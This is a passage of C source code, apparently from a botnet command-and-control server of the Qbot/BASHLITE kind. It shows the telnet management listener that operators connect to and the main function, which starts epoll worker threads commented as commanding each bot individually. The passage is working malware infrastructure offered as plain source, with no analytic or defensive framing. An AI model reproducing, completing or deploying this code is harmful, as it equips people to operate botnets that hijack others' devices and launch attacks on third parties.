        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(MY_MGM_PORT);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main(int argc, char *argv[])
{
        signal(SIGPIPE, SIG_IGN);
                
        int s, threads;
        struct epoll_event event;
        
        if (argc != 3)
        {
                fprintf (stderr, "IDIOT PROOF!\n");
                exit (EXIT_FAILURE);
        }
        fileFD = NULL;
        threads = atoi(argv[2]);
 
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
 
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
 
        s = listen (listenFD, SOMAXCONN);
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
                
        epollFD = epoll_create1 (0);
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
 
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
                
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
                
        pthread_create(&thread[0], NULL, &telnetListener, (void *)NULL);
                
        while(1)
        {
                sleep(60);
        }
 
        close (listenFD);
 
        return EXIT_SUCCESS;
}